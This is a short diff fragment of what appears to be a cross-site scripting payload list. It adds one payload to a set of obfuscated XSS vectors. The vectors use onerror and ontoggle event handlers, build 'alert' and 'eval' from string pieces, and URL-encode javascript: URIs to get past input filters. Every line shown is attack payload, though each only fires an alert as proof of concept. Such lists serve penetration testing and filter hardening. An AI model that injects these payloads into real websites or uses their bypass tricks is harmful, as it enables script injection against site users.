@@ -13,7 +13,7 @@ windiow
 <img src=1 alt=al lang=ert onerror=top[alt%2blang](0)>
 <details open ontoggle=top['al'%2B'ert'](1) >
 <iframe src="javascript:%61%6c%65%72%74%28%31%29">
-  
+ <details open ontoggle=top[a='al',b='ev',b%2ba]('alert(1)')>
   
 <img src=1 onerror=location="javascript:alert(1)">
   <details open ontoggle=top[/al/.source+/ert/.source](8);>
